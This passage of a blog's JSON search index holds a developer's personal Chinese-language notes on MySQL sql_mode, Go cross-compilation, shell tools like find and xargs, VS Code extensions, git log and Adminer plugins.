'`可以正常寫入\n當然他也沒有很聰明`''`跟`'NULL'`會變NULL\n\n可能要改sql_mode改成沒嚴格模式\n不過嚴格模式，主管擔心要重啟MySQL\n所以也不能隨意重啟orz\n\n最後網路上有爬到[XYZ的筆記本: MySQL Server 的 SQL Modes](https://xyz.cinc.biz/2013/08/mysql-server-sql-modes.html)\n>SQL Modes 預設值：\n在 5.6.5 和之前的版本，預設值是空的，沒有設置。\n在 5.6.6 和之前的版本，預設值是 NO_ENGINE_SUBSTITUTION。\n查詢目前 SQL Modes 目前的設定：\nSELECT @@GLOBAL.sql_mode;\nSELECT @@SESSION.sql_mode;\nGLOBAL.sql_mode 是目前伺服器的設定值，SESSION.sql_mode 是目前連線的設定值\n設定 SQL Modes 方法有以下三種：\n1.修改設定檔(my.cnf或my.ini)中的 sql-mode=\"設定值\"\n2.MySQL啟動時，加參數 --sql-mode=\"設定值\"\n3.連線登入後修改\nSET GLOBAL sql_mode='設定值';\nSET SESSION sql_mode='設定值';\nGLOBAL 是修改目前伺服器的設定值，SESSION 是修改目前連線的設定值\n\n看到下面的`3.連線登入修改`，就謝天謝地\n當然也要注意重新啟動，記得要改my.cnf\n\n```\n# /etc/mysql/my.cnf\n\n[mysqld] \nsql_mode = NO_ENGINE_SUBSTITUTION\n```\n\n不用這個方法改code不知改道何時才會改完...\n\n\n最後新專案開發用到MySQL還是啟用\n比較不會出問題\n```\n[mysqld]\nsql_mode='ONLY_FULL_GROUP_BY,NO_AUTO_VALUE_ON_ZERO,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,\nERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,PIPES_AS_CONCAT,ANSI_QUOTES'\n```\n參照來源:[mysql的sql_mode合理设置](http://xstarcd.github.io/wiki/MySQL/MySQL-sql-mode.html)\n\n感覺比較不會出甚麼嚴重問題\n","tags":["sql"],"categories":["MySQL"]},{"title":"GO編譯程式紀錄","url":"%2Fblog%2F2018%2F09%2F01%2FGO%E7%B7%A8%E8%AD%AF%E7%A8%8B%E5%BC%8F%E7%B4%80%E9%8C%84%2F","content":"\n最近玩golang最喜歡它編譯可以直接跨平台執行\n而且看了一下\n真的很簡單，只需要一行`go build`\n但真的是這樣的嗎?\n(不然也不會有這一篇了XD)\n\n<!--more-->\n\ngolang編譯真的很簡單\n只需要`go build main.go`即可以編譯`main.go`\n但是`go build`是整個目錄都會進行編譯\n編譯出來的程式正常`本機`可以執行\n\n**為什麼要框住本機呢**\n\n因為這就是我踩雷的地方\n```\nMac 下编译 Linux 和 Windows 64位可执行程序\nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go\nCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go\n\nLinux 下编译 Mac 和 Windows 64位可执行程序\nCGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.go\nCGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go\n\nWindows 下编译 Mac 和 Linux 64位可执行程序\nSET CGO_ENABLED=0\nSET GOOS=darwin\nSET GOARCH=amd64\ngo build main.go\n\nSET CGO_ENABLED=0\nSET GOOS=linux\nSET GOARCH=amd64\ngo build main.go\n```\n參考來源:[Golang 在 Mac、Linux、Windows 下如何交叉编译 - CSDN博客](https://blog.csdn.net/panshiqu/article/details/53788067)\n假如你是在window用git-bash話，前面變數可以加`export`\n當然後面的`main.go`可以不用填\n\n正常有`go get`套件編譯會沒有問題\n\n環境變數設定完，可以`go env`查看GO環境變數設定值\n\n但重點來了\n\n## 編譯後別台電腦不能執行\n\n奇怪我把程式丟到Linux竟然不能執行  (說好的編譯可以跑的  囧)\n但發現執行錯誤訊息\n竟然有出現我在Win7路徑\n當下沒有留意到是抓不到Package問題\n好像有甚麼**address**關鍵字錯誤\n因為同事也有在玩\n他說是抓不到套件關係\n\n後來有爬到一個指令\n在程式目錄執行\n```\ngo build -a -v\n```\n\n這樣就很神奇可以跑\n不過我在win7編譯Linux程式，在Linux還是不能跑\nLinux編譯Win7程式，在Win7正常執行\n但是在Win10編譯Linux程式，在Linux正持行\n反之也可以\n\n不知道Win7編譯GO怎麼了....\n\n其實這篇重點只有`go build -v -a`\n但網路上看到的文章真的不多\n不知道為什麼...(有可能我方法不正確)\n\n## gitea編譯紀錄\n中間有試著`gitea`編譯\n```\nmake generate all\n```\n不知道這一行我不能執行\n但輸入`make`就正常運行\n輸入`go build -v -a`也能跑，(`go build`好像不能)\n\n\n\n參考來源\n[golang - Go语言的三个命令 go build, go install, go get - SegmentFault 思否](https://segmentfault.com/q/1010000004044176)\n[go build - GO 命令教程 - 极客学院Wiki](http://wiki.jikexueyuan.com/project/go-command-tutorial/0.1.html)","tags":["GO"],"categories":["GO"]},{"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","url":"%2Fblog%2F2018%2F08%2F28%2FMySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C%2F","content":"\n其實對MySQL管理那一塊真的不是很熟\n但最近踩到一堆雷\n還是記一下 Linux跟Windows運行MySQL會不一樣的雷\n哪天說不定還會踩到orz\n\n<!--more-->\n\n## MySQL在Linux下預設有分大小寫\n之前在玩Docker發現MySQL底下，Linux有分大小寫\n奇怪，為什麼我大學在Windows下就沒事\n當初在轉docker時候遇到這個問題\n當下就只記window大小寫沒分，Linux有分大小寫\n但沒有理解為什麼\n不過，今天有爬到[MySQL表名大小写敏感导致的问题 - CSDN博客](https://blog.csdn.net/postnull/article/details/72455768)\n原來用window同一個目錄不能存在`test.txt`和`Test.txt`這兩個檔案(我用window20多年都不知道有這個問題 囧)\n\n### 查看是否有用大小寫變數\n```\nshow variables like '%lower_case_table_names%';\n```\n### 修改大小寫方法\n> 修改变量lower-case-table-names\n>\n>为什么会出现这个问题，主要是因为开发和测试环境不一致导致的，这也是有时测试环境完全没问题，一到生产就出诡异问题的原因之一。所以，我们除了让测试同事认真测试外，最好本地和测试环境还是一致。\n对当前这个问题，我们直接修改SQL中的Emp为emp即可解决问题，但是为了根本解决问题，我们还须修改mysql的环境变量，也就是将lower_case_table_names的值改为0.\n修改方法：\n1. 找到mysql的安装位置\n2. 找到主目录下的my.ini配置文件\n3. 在[mysqld]节点下添加lower-case-table-names=0\n4. 重启mysql服务\n來源[MySQL表名大小写敏感导致的问题 - CSDN博客](https://blog.csdn.net/postnull/article/details/72455768)\n\n\n## Incorrect integer value: '' for column 'id'\n最近事情這樣的，公司有程式做報表匯入動作`Incorrect integer value: '' for column 'id'`\n經過查詢SQL語法發現，目前程式匯入某欄位剛好抓到price為空\n導致SQL會有問題\n\n當下我以為應該不能跑\n不過在我開發環境(window)竟然可以跑\n```sql\nINSERT INTO  `test`(test ,num)\n values ( 'fff','');\n```\n注意`num`為int\n開發環境竟然可以跑!!!!!\n\n更奇葩的是`fff`也能過\n{% asset_img mysql_warning.jpg MySQL_Warning %}\n\n後來有找到[解决Incorrect integer value: '' for column 'id' at row 1的方法 - CSDN博客](https://blog.csdn.net/testcs_dn/article/details/39670421)\n是sql_mode有開啟`STRICT_TRANS_TABLES`\n\n>my.ini中查找sql-mode，默认为sql-mode=\"STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\"，\n将其修改为sql-mode=\"NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\"，重启mysql后即可\n參考來源:\n* [解决Incorrect integer value: '' for column 'id' at row 1的方法 - CSDN博客](https://blog.csdn.net/testcs_dn/article/details/39670421)\n* [STRICT_TRANS_TABLES(存储引擎启用严格模式，非法数据值被拒绝)。 - Jesson - ITeye博客](http://hello-jesson.iteye.com/blog/1569388)\n\n\n## 結論\n用MySQL開發還是用Docker開發，不然MySQL在Window和Linux兩個環境真的差好多  囧\n不然事後上線真的很慘，至於公司為什麼以前可以跑\n好像上禮拜DB掛掉重裝，那台MySQL裡面sql_mode變數有設定STRICT_TRANS_TABLES\n所以導致以前可以跑，但現在不能\n\n沒事還是不要用Windows 囧\n\n\n```\nselect @@sql_mode\n-- window底下(xxamp)\n-- NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\n-- 公司底下(別台設定)\n-- NO_ENGINE_SUBSTITUTION\n-- docker 啟動mysql(不知道為什麼設定一大堆......)\n-- ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION\n```\n\n","tags":["MySQL"],"categories":["寫程式一些事"]},{"title":"go安裝筆記&gopath環境變數設定","url":"%2Fblog%2F2018%2F08%2F27%2Fgo%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A%2F","content":"\n最近想玩玩看GO\n在ElementaryOS安裝GO\n踩幾個雷，紀錄一下筆記\n這次的雷還深深了解以前code設定環境變數用途\n<!--more-->\n\n## apt-get 安裝GO\n我比較懶，所以選擇這個方式安裝\n用`apt-get install golang-go`\n安裝完你會發現版本太舊\n有些需要1.8版以上才能跑\n`apt-get install golang-1.10-go`\n記得這邊要加PATH環境變數\n`export PATH=\"$PATH:/usr/lib/go-1.10/bin`\nbash加在`~/.profile`或`~/.bashrc`\nzsh加在`.zshrc`\n之後有一篇會再講\n\n參考來源\n[Ubuntu · golang/go Wiki](https://github.com/golang/go/wiki/Ubuntu)\n\n\n\n## GOPATH\n\n沒有權限使用，可以改這個環境變數\n\n>Go 1.8 is introducing a default GOPATH. If you don’t set one, the tools will use the default. Default GOPATH is:\n>    $HOME/go on Unix-like systems\n>    %USERPROFILE%\\go on Windows\n[The default GOPATH · Go, the unwritten parts](https://rakyll.org/default-gopath/)\n\n原本以為會遇到這個問題\n還有`GOROOT`可以設定GO目錄\n不過我沒設定好像也能跑\n所以就沒設定\n詳細一些東西可以看裡面東西\n[go环境变量配置 (GOROOT和GOPATH) - 简书](https://www.jianshu.com/p/4e699ff478a5)\n\n\n## 其他程式語言兩三事\n\n等等...，為什麼GOPATH就能解決權限問題\n那...php,nodejs,沒有一樣設定的東西嗎\n\n### java classpath\n印象中...可以在環境變數先加classpath\n不過這應該跟我們這篇沒關係\n先跳過\n\n\n\n### nodejs 設定套件golbal存放位置\n`npm config get prefix`\n可以抓到現在`npm install xxxx -g`存放路徑\nLinux預設存放\n`/usr/`\n`C:\\Users\\(User)\\AppData\\Roaming\\npm`\n\n這邊我就很好奇，為什麼Linux可以執行`node`global為什麼可以在cmd上面打\n原來那些路徑有設定到`PATH`\nLINUX會在`/usr/bin`加程式位置\n所以你可以打指令執行\n\n所以你自訂`npm config set prefix ~/.npm-package`\n加完~~不要高興太早~~記得要在`$PATH`加入你npm設定位置\n不然cmd呼叫不到\n[The Will Will Web | 如何在 Windows 平台變更 Node.js / npm 全域模組的預設安裝路徑](https://blog.miniasp.com/post/2015/09/01/Change-npm-default-global-installation-directory-for-nodejs-modules-in-Windows.aspx)\n\n\n`npm install --prefix <path/to/prefix_folder> -g`好像能指定目錄安裝\n\n[npm install --prefix: still available? · Issue #11007 · npm/npm](https://github.com/npm/npm/issues/11007)\n[node.js - How to npm install to a specified directory? - Stack Overflow](https://stackoverflow.com/questions/14469515/how-to-npm-install-to-a-specified-directory)\n\n更詳細介紹[npm的.npmrc文件在哪里？缓存及全局包文件在什么位置？](https://newsn.net/say/npm-whereis.html)\n原來更改這些設定會寫入到`~/.npmrc`裡面\n\n\n### php - composer  global\n\n執行路徑會在composer 本目錄下\n我沒有用過\n先筆記\n[php - Change composer global path (Windows) - Stack Overflow](https://stackoverflow.com/questions/25549177/change-composer-global-path-windows/25569354)\n[php - Where to find composer's global packages? - Stack Overflow](https://stackoverflow.com/questions/30664220/where-to-find-composers-global-packages)\n\n### python pip \n\n這個就爬得很久...\napt-get預設安裝在root上面\n所以很大機率pip安裝都要加root\n\n[python自定义安装python包－pip的使用-Bluesky's blog](http://yangl.net/2018/05/18/python-pip-usage/)\n\n>用户目录下面，.pip目录下建立pip.conf文件，文件内容如下：\n>[install]\n>install-option=--prefix=~/.local\n>然后pip的库就安装到用户目录下的.local下面了\n[python自定义安装python包－pip的使用-Bluesky's blog](http://yangl.net/2018/05/18/python-pip-usage/)\n\n這就沒有測試了...，奇怪這篇重點好像是GO\n怎麼扯到別的程式語言呢XD\n\n\n最後最近玩GO\n他的package跟別的程式語言差好多\n看來有空還是簡單記一下\n[從 PHP 到 Golang 的筆記](https://yami.io/php-to-golang/)\n","tags":["go"],"categories":["GO"]},{"title":"elementary OS更換Terminal字形 & 設定zsh環境變數","url":"%2Fblog%2F2018%2F08%2F26%2Felementary-OS%E6%9B%B4%E6%8F%9BTerminal%E5%AD%97%E5%BD%A2-%E8%A8%AD%E5%AE%9Azsh%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%2F","content":"\n\nTo change font in the Terminal you need dconf-editor. Install it, if you haven't done so:\n\nsudo apt-get install dconf-tools\n\nRun it and go to path org > gnome > desktop > interface > monospace-font-name. \n\n[FB](https://www.facebook.com/groups/199493136812961/permalink/1544001102362151/?__xts__%5B0%5D=68.ARC1KrGOX9zJkDFN4oR8J3H5qUpRcg4qwmQqIuL9msps-za6SyHMsgZJBkwg5PyLQVaSV5S9sIzyG5WI982VuimrBiaxzKkLE88JdlPNUY1UQSfEt2d1yeNj2_rXMCr2zrN8ODo&__tn__=-R)\n[themes - How can I change the default Terminal font? - elementary OS Stack Exchange](https://elementaryos.stackexchange.com/questions/1149/how-can-i-change-the-default-terminal-font/1153#1153)\n\n\n.zshrc\n\n\n```\n    下面修改环境变量，将~/.composer/vendor/bin写入 PATH 环境变量里。\n\n    注意： 如果你的命令行安装了zsh和oh-my-zsh，修改环境变量时有些小的变化。\n\n    我遇到的就是这个问题，怎么修改，环境变量都不生效，比如我修改的是~/.bash_profile，那么必须`source\n    ~/.bash_profile`才能生效，而且重启后继续无效，为什么呢？因为 zsh ！我的终端是\n    iTerm2，它很炫酷，但是就是环境变量搞不成。Google 找到了问题所在，安装 zsh\n    后，~/.bash_profile并没有被执行，所以需要编辑 zsh 的配置文件~/.zshrc，在该文件里加入\n\n    source ~/.bash_profile 现在我们应该可以用homestead命令了。\n\n```\nhttps://segmentfault.com/q/1010000004376181/a-1020000004377872\n\n\n發現這篇很久沒補\n就先寫重點吧...\n","tags":["Linux"],"categories":["Linux"]},{"title":"window桌面新增檔案/資料夾，畫面不會即時更動","url":"%2Fblog%2F2018%2F08%2F22%2Fwindow%E6%A1%8C%E9%9D%A2%E6%96%B0%E5%A2%9E%E6%AA%94%E6%A1%88-%E8%B3%87%E6%96%99%E5%A4%BE%EF%BC%8C%E7%95%AB%E9%9D%A2%E4%B8%8D%E6%9C%83%E5%8D%B3%E6%99%82%E6%9B%B4%E5%8B%95%2F","content":"\n公司電腦桌面新增檔案，畫面不會即時...\n網路找都找不到是什麼問題?\n最後找到這一篇[資料夾怪怪的,不能即時更新 - 其他應用軟體 - 電腦討論區 - Mobile01](https://www.mobile01.com/topicdetail.php?f=512&t=1931352&p=1#31381395)\n\n<!--more-->\n\n```\n這個問題發生很久了.\n想說爬文解決.結果爬到這篇.\n\n不過昨天試了一個方法.\n可以解決此問題.\n\n1.開 C 槽\n2.組合管理 - 資料夾搜尋選項\n\n進去後. 全部還原成預設值. 就好了.\n\n每個槽都要做一次.\n\n因為我全部都做了.來不及比對差在那裡\n如果大家試有效.可以幫忙比對一下. 是那個選項造成的.\n```\n\n\n真的有用，筆記筆記","tags":["windows"],"categories":["維修小記"]},{"title":"vscode嘗試使用ftp套件心得","url":"%2Fblog%2F2018%2F08%2F20%2Fvscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97%2F","content":"\nSublime Text 有一個很好用sftp套件\n但最近換到vscode\n很缺一個方便看ftp\n嘗試了3個ftp套件\n[ftp-kr - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=ruakr.ftp-kr#review-details)\n[ftp-simple - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=humy2833.ftp-simple#review-details)\n[sftp - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=liximomo.sftp#review-details)\n\n<!--more-->\n\n有稍微網路爬一下[Visual Studio Code几款FTP插件使用总结 - 我的笔记 - SegmentFault 思否](https://segmentfault.com/a/1190000012875114)\n好像沒有好用套件\n我也沒有需要本地端通部上傳到ftp\n希望手動上傳\n\n## [ftp-kr - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=ruakr.ftp-kr#review-details)\n網路上看到人家推的\n基本ftp好像不錯用\n不過上傳會一直跳出提示視窗(不會自動關掉...)\n這點我還滿不喜歡\n不過可以設定多個帳號也不錯\n{% asset_img vscode_ftp_kr.gif \"Remote Explorer\" %}\n\n## [ftp-simple - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=humy2833.ftp-simple#review-details)\n也上網路上看到的\n好像有看到有一篇說很像Sublime Text 的sftp套件，但是我覺得不像....\n不過他有一個特點，上傳模式都是手動上傳\n額且上傳本地端檔案名稱可以上傳ftp上面不一樣的檔名\n這還有點神奇\n假如喜歡手動設定多樣需求\n這個一定很好用\n{% asset_img vscode_ftp_simple.gif \"ftp-simple\" %}\n\n\n## [sftp - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=liximomo.sftp#review-details)\n接下來這一套是往自己搜尋到的\nvscode預設搜尋好像照星星數排的\n但是`ftp @sort:installs`搜尋下載數最高是這個\n嘗試結果，看到有**ftp diff功能**，這個功能我覺得還滿好用的\n基本上傳也不會跟[ftp-kr - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=ruakr.ftp-kr#review-details)彈出東西\n而且有一個**Remote Explorer**\n可以不用再開filezilla看了XD\n{% asset_img remote-explorer.png \"Remote Explorer\" %}\n{% asset_img vscode_sftp.gif \"sftp\" %}\n\n\n## 心得感想\n\n其實這三套嚴格說都不差\n目前個人排名\n`sftp > ftp-simple > ftp-kr`\n\n","tags":["ftp"],"categories":["實用工具"]},{"title":"vscode使用svn做版控簡單筆記","url":"%2Fblog%2F2018%2F08%2F20%2Fvscode%E4%BD%BF%E7%94%A8svn%E5%81%9A%E7%89%88%E6%8E%A7%E7%B0%A1%E5%96%AE%E7%AD%86%E8%A8%98%2F","content":"\n由於公司舊專案都是用SVN去開發的\n但最近...接觸的案子都是舊專案\n平常看這次修改差異都要切到TortoiseSVN\n但今天鼓起勇氣嘗試[SVN - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=johnstoncode.svn-scm)\n在此做個筆記\n\n<!--more-->\n\n>If you use TortoiseSVN, make sure the option Command Line Tools is checked during installation and C:\\Program Files\\TortoiseSVN\\bin is available in PATH.\n\n想說我安裝目錄也在相同路徑，環境變數也有設定PATH\n就直接安裝，裝完重啟竟然跑出沒有SVN訊息....\n\n覺得怪怪的，有趣命令提示字元打`svn`，沒有反應\n在想是不是沒安裝`command line`東西，試著重新安裝\n果然有command line選項\n\n{% asset_img vscode_svn.jpg \"TortoiseSVN安裝選單\" %}\n\n\n然後vscode操作svn版本操作介面跟git一樣\n只能說vscode太神了\n\n\n我所有編輯器都混著用\n從Sublime Text70% 到vscode 30%\n現在到vscode 80%到Sublime Text 20%\n\n不過大量文字編輯我還是習慣用Sublime Text\n\n\n[SVN Gutter - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=beaugust.blamer-vs)\n好像類似gitlens東西\n不過有空再試驗看看","tags":["svn"],"categories":["實用工具"]},{"title":"xargs 參數代換簡單使用筆記","url":"%2Fblog%2F2018%2F08%2F18%2Fxargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98%2F","content":"\n\n最近做`find . -mmin -60 |  ls -l `發現怎麼不能讀ls內容\n原來我以為 `|`pipe 就是把輸出結果加到後面去\n但是並非跟`<,<<`一樣\n所以我在stackoverflow找到[linux - Unix pipe into ls - Stack Overflow](https://stackoverflow.com/questions/18210956/unix-pipe-into-ls)\n要使用xargs\n不過我真的對這個不太熟\n\n\n\n<!--more-->\n\n相關資料流重新導向可以看[鳥哥的 Linux 私房菜 -- 第十章、認識與學習BASH](http://linux.vbird.org/linux_basic/0320bash.php#redirect)\n{% asset_link Wang_web.png \"上面連結備份圖\" %}\n\nxargs網路有爬到[Linux 系統 xargs 指令範例與教學 - G. T. Wang](https://blog.gtwang.org/linux/xargs-command-examples-in-linux-unix/)講解非常清楚\n\n這邊我就簡單紀錄看起來很常用的指令\n\n`xargs` 在指令輸入\n可以接著輸入很多東西\n```\na b c\ndef\n```\n再按`Ctrl+d`可以看到螢幕輸出`a b c def`\n\n## xargs簡單小試\n\n` xargs ls`\n再輸入`.`\n再按下`Ctrl+D`\n可以跳出\n\n所以我們`find . -mmin -60 |  ls -l `這段\n要改成`find . -mmin -60 | xargs  ls -l`\n\n## 執行前的確認\n`-p`會問要不要執行這個參數\necho a b c d e f| xargs -p\n\n\n\n## 實用指令\n\n參考[Linux 系統 xargs 指令範例與教學 - G. T. Wang](https://blog.gtwang.org/linux/xargs-command-examples-in-linux-unix/)\n```sh\nfind . -name '*.c' | xargs grep 'stdlib.h'\n```\n輸出結果\n```\n./CMake/TestOggTheoraSubsampling.c:#include <stdlib.h>\n./Wrapping/Tools/lex.yy.c:#include <stdlib.h>\n./Wrapping/Tools/vtkWrapPythonInit.c:#include <stdlib.h>\n./Wrapping/Tools/vtkWrapTcl.c:#include <stdlib.h>\n./Wrapping/Tools/vtkWrapTclInit.c:#include <stdlib.h>\n./Wrapping/Tools/vtkParsePreprocess.c:#include <stdlib.h>\n./Wrapping/Tools/vtkWrapText.c:#include <stdlib.h>\n./Wrapping/Tools/vtkParseData.c:#include <stdlib.h>\n./Wrapping/Tools/vtkParseHierarchy.c:#include <stdlib.h>\n./Wrapping/Tools/vtkParseMain.c:#include <stdlib.h>\n```\n\n這個指令感覺很實用","tags":["xargs"],"categories":["Linux"]},{"title":"Linux find 實用指令筆記","url":"%2Fblog%2F2018%2F08%2F18%2FLinux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98%2F","content":"\n最近看同事用`find`搜尋異動檔案指令\n真的很方便\n不用`ls -l`看了老半天\n這真的太好用了\n筆記筆記\n\n<!--more-->\n\n以下筆記是參考\n{% asset_link gtwang.org_web.png \"Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang 備份圖\" %}\n[Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang](https://blog.gtwang.org/linux/unix-linux-find-command-examples/)\n\n\n## -mmin(實用)\nfind . -mmin -5\n\n查詢現在異動時間5分鐘的檔案\n這招很實用\n尤其跑程式，查詢有異動那些檔案\n真的很方便ˇ\n\n## -type\n\n`- type {xx}`找檔案類型\n\n找檔案` -f `\n\n找資料夾 ` -d `\n\n\n\n## -size \n\n`-size 100M`剛好100MB\n\n`-size +50M`大於50MB\n\n`-size -50M`小於50MB\n\n\n## -perm xxx\n\n搜尋權限\n\n`-perm 777`\n\n## -empty\n如果要找尋空檔案，可以使用 -empty 參數：\n```sh\nfind . -type f -empty\n```\n\n找尋空目錄：\n\n```sh\nfind . -type d -empty\n```\n\n\n參考來源:\n[Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang](https://blog.gtwang.org/linux/unix-linux-find-command-examples/)","tags":["find"],"categories":["Linux"]},{"title":"'Hello World' || '' 在PHP與 JavaScript程式Logical Operators差異","url":"%2Fblog%2F2018%2F08%2F18%2FHello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0%2F","content":"PHP和JavaScript同樣兩個都是軟型態\n大同小異，但做這個Logical Operators結果不一樣\n\n最近不小心在PHP寫出一個bug\n被同事抓到了\n同一個雷不要在踩\n<!--more-->\n\n## PHP\nPHP一定回傳boolean\n```php\n$a = 0 || 'avacado';\nprint \"A: $a\\n\";\n```\n>will print:\nA: 1\n\n{% asset_img php_lo.png \"PHP Logical Operators\" %}\n[PHP: Logical Operators - Manual](http://php.net/manual/en/language.operators.logical.php#77411)\n\n\n## JavaScript\n`'ex1'||'ex2'`true傳回'ex1' false 傳噡'ex2'\n\n不過剛看了下面MDN寫的內容\n{% asset_img js_lo.png \"JavaScript Logical Operators\" %}\n[Logical Operators - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Logical_Operators#Description)\n\n還有`'ex1'&& 'ex2'`\ntrue傳回ex2\nfalse傳回ex1\n\n大部份比較常在JS看到 `||`，但是`&&`真的比較少看到\n","tags":["Logical operators"],"categories":["PHP"]},{"title":"git log簡單用法筆記","url":"%2Fblog%2F2018%2F08%2F17%2Fgit-log%E7%B0%A1%E5%96%AE%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98%2F","content":"\n最近學會使用`git log`\n但怕很久沒用就會忘了\n簡單記錄一下\n\n<!--more-->\n\n**Git branch(分支)是一個pointer概念**\n通常習慣用`gitk`看分支圖片\n再不會可以用`TortoiseGit`和`sourcetree`\n在下兩個都不排斥\n但是sourcetree安裝時候要登入帳號密碼\n所以我沒有在公司用了\n\n但今天不是要講gui界面多好用\n你會看`git log  --graph --oneline`\n就可以省略看GUI界面\n\n\n平常在分之底下看`git log`，一開始覺得奇怪怎麼不顯示全部分支\n**事後懂了git branch是一個pointer概念**\n覺得看全部真的沒有意義(應該正常需求不會看到)\n全部看到會覺得太亂\n通常在這條分支看過去紀錄，反正merge過後`git log`都看到\n真的沒必要多個`--all`\n\nPS:看圖`--graph`\n\n`--oneline`顯示一行，英文就是`one line`和在一起\n\n`-p -(n)`秀diff 程式碼\n>$ git log -p -2\n最常用的選項之一為 -p，用來顯示每個更新之間差別的內容。 另外還可以加上 -2 參數，限制為只輸出最後兩個更新。\n\n通常也不用死記\n`git bash`tab 可以自動autocomplete\n(工程師沒辦法記太多東西>.<)\n\n剛開始看不是很懂`git log`全部分支\n但自從懂git branch是pointer概念\n就開竅了XDD\n\n參考來源:\n[Git - 檢視提交的歷史記錄](https://git-scm.com/book/zh-tw/v1/Git-%E5%9F%BA%E7%A4%8E-%E6%AA%A2%E8%A6%96%E6%8F%90%E4%BA%A4%E7%9A%84%E6%AD%B7%E5%8F%B2%E8%A8%98%E9%8C%84)","tags":["log"],"categories":["Git"]},{"title":"adminer 管理DB工作裝套件記錄","url":"%2Fblog%2F2018%2F08%2F17%2Fadminer-%E7%AE%A1%E7%90%86DB%E5%B7%A5%E4%BD%9C%E8%A3%9D%E5%A5%97%E4%BB%B6%E8%A8%98%E9%8C%84%2F","content":"\n這篇記錄adminer要怎麼裝套件，步驟真的不複雜\n簡單記一下\n\n<!--more-->\n\n首先我需要一個table欄位置頂功能\n我看我plugin都沒有\n~~(沒有當然自幹XDD))~~\n裝上[stylus]](https://addons.mozilla.org/zh-TW/firefox/addon/styl-us/)\n\n設定\n```css\ntable{\n    border-collapse: separate;\n}\n\ntable td,table th{\n    border-color: rgba(153, 153, 153,.7)\n}\n\ntable thead {\n    position: sticky;\n    top: 0px;\n}\n```\n\n其實簡單用到sticky\n發現sticky要在table為spearate才有用...\n但是sparate真的很難看\n原本想用小border\n但發現border`沒辦法縮的比1px還小`\n[CSS border less than 1px - Stack Overflow](https://stackoverflow.com/questions/13891177/css-border-less-than-1px)\n\n這其實可以獨立寫一篇XD\n最後參照stack overflow設定透明度\n有看得比較順眼\n\n參考來源\n* [CSS border less than 1px - Stack Overflow](https://stackoverflow.com/questions/13891177/css-border-less-than-1px)\n* [CSS border-collapse 属性](http://www.w3school.com.cn/cssref/pr_tab_border-collapse.asp)\n* [CSS border-spacing 属性](http://www.w3school.com.cn/cssref/pr_tab_border-spacing.asp)\n* [css - Why border is not visible with \"position: sticky\" when background-color exists? - Stack Overflow](https://stackoverflow.com/questions/41882616/why-border-is-not-visible-with-position-sticky-when-background-color-exists)\n\n\n\n等等，還沒介紹adminer\n\n\n可以先新增一個資料夾\n把adminer放裡面，再把順眼的adminer plugin抓下來\n推薦[struct-comments](https://raw.githubusercontent.com/vrana/adminer/master/plugins/struct-comments.php)\n設定一個`index.php`\n[使用套件教學](https://www.adminer.org/en/plugins/#use)\n\n```php\n<?php\nfunction adminer_object() {\n    // required to run any plugin\n    include_once \"./plugins/plugin.php\";\n    \n    // autoloader\n    foreach (glob(\"plugins/*.php\") as $filename) {\n        include_once \"./$filename\";\n    }\n    \n    $plugins = array(\n        // specify enabled plugins here\n        new AdminerDumpXml,\n        new AdminerTinymce,\n        new AdminerFileUpload(\"data/\"),\n        new AdminerSlugify,\n        new AdminerTranslation,\n        new AdminerForeignSystem,\n    );\n    \n    /* It is possible to combine customization and plugins:\n    class AdminerCustomization extends AdminerPlugin {\n    }\n    return new AdminerCustomization($plugins);\n    */\n    \n    return new AdminerPlugin($plugins);\n}\n\n// include original Adminer or Adminer Editor\ninclude \"./adminer.php\";\n?>\n```\n\n[PHP: glob - Manual](http://php.net/manual/en/function.glob.php)\n算是很神的method\n可以用神奇的方法抓到想要的檔案\n自動載入也可以參考__autoload\n\n\n當然也可以直接去github找人家用好的adminer版本\n[dg/adminer-custom: Customizations for Adminer, the best database management tool written in 